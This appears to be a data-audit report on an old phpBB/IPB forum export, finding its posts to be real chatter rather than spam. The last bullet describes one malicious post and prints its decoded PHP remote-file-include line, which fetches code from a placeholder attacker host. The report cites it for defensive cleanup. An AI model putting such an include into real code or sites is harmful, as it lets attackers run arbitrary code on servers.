# Forum spam scan (2026-10-23)
Source: normalized `/mnt/hdd/projects/funnyguy/forum/forum.sqlite` (already stripped of PMs, emails, IPs, hashes). No names recorded here.

**Verdict: the ~8,600 posts are real conversation, not spam.** The volume comes from a tiny group posting a lot.
| | phpBB 2005 | IPB 2005-06 |
|---|---|---|
| posts / topics / authors | 4,512 / 221 / 20 | 4,123 / 185 / 20 |
| top 3 authors' share | 74% | 57% |
| median words per post | 13 | 17 |
| exact-duplicate bodies | 12 posts in 6 groups | 43 in 12 groups (14x one "lol" smiley) |
| spam-keyword hits (strong) | 22 combined, all false positives (jokes, a mod warning, admin noting casino bots) | |
| authors with <=5 posts | 5, all friends introducing themselves | 6, all plausible chatter |
- Heavy days (100+ posts) are chat marathons: single authors posting 20+ times in an hour on the same night, with long threads (one topic has 483 posts, another 381).
- Linked domains are fgcomics.com, imageshack, WoW, rapidshare, bungie.net: normal for the era.
- One admin post says two new members "are bots sent by an online casino company"; those accounts are not in the 20 authors, so the dump was already clean of them (or they were deleted).
- **One malicious post:** an IPB post from a 1-post member contains a PHP `eval( chr(..) )` payload (a remote-file-include attack: it decodes to `include "http://<attacker-domain>/silme.txt"`, posted 2006-12-29, the board's last day, so likely how it ended). Exclude it from any import and always render post bodies escaped.
